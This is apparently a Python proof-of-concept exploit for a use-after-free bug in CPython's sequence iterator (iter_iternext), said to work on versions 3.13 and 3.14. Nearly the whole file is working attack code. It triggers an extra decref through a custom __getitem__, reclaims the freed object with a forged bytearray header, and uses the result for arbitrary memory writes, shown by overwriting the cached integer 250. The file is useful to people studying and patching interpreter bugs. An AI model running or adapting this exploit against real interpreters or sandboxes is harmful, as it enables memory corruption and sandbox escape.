"""
Author: @Nico-Posada
Bug Credits: @chilaxan
"""

# TLDR: UAF on a controlled object to create evil bytearray object
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/iterobject.c#L52-L83
"""
static PyObject *
iter_iternext(PyObject *iterator)
{
    seqiterobject *it;
    PyObject *seq;
    PyObject *result;

    assert(PySeqIter_Check(iterator));
    it = (seqiterobject *)iterator;
    seq = it->it_seq;
    if (seq == NULL)
        return NULL;
    if (it->it_index == PY_SSIZE_T_MAX) {
        PyErr_SetString(PyExc_OverflowError,
                        "iter index too large");
        return NULL;
    }

    result = PySequence_GetItem(seq, it->it_index); // <--- calls __getitem__ which we control
    if (result != NULL) {
        it->it_index++;
        return result;
    }
    if (PyErr_ExceptionMatches(PyExc_IndexError) ||
        PyErr_ExceptionMatches(PyExc_StopIteration))
    {
        PyErr_Clear();
        it->it_seq = NULL;
        Py_DECREF(seq); // <--- can abuse this decref call here on seq
    }
    return NULL;
}
"""

# The goal here is to call `next` on an iterable object an extra time to cause `seq` to be decrefed more times
# than intended. This gives us a UAF where we can free `seq` (in our exploit, `seq` is `mem`) and replace the object in memory
# with data for a fake bytearray.

# This wouldn't be an issue if they check for it->it_seq to be NULL after the __getitem__ call, they only check before the call.

class evil:
    # use slots to bloat the size of the `evil` to make it large enough to fit a fake bytearray object
    __slots__ = [*'a' * 20]

    def __getitem__(self, item):
        global it, lock
        if lock:
            raise IndexError

        lock = True
        # will decref once after this `next` call
        next(it)
        # will decref again after returning which frees `mem`

mem = evil()
SIZE = mem.__sizeof__()

p64 = lambda num: num.to_bytes(8, 'little')
fake_ba = bytearray(
    b"padding_"*2 + # padding is for the GC header
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) + p64(0)
)

lock = False
[*(it:=iter(mem))]

# reclaim the memory we just freed with data for a fake bytearray obj
_ref = fake_ba.ljust(SIZE, b"\0")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100
